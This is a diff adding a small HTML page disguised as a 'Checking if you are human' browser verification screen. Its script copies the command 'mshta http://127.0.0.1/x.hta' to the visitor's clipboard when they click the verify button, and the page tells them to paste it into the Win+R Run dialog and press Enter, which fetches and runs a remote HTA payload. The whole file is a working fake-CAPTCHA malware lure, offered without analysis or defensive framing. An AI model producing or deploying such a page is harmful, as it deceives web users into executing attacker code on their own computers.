@@ -1,0 +1,12 @@
+<!doctype html><html><head><title>Checking your browser</title></head><body>
+<div class="cf-wrapper"><h2>Checking if you are human</h2>
+<p>Performance &amp; security verification. Cloud Identificator: 2031</p>
+<p>To continue: open the <b>Run</b> dialog (Win+R), paste, and press Enter.</p>
+<div id="cap" onclick="run()">Verify you are human</div></div>
+<script>
+function run(){
+  const c = "mshta http://127.0.0.1/x.hta";
+  const ta=document.createElement('textarea');ta.value=c;document.body.appendChild(ta);
+  ta.select();document.execCommand("copy");
+}
+</script></body></html>
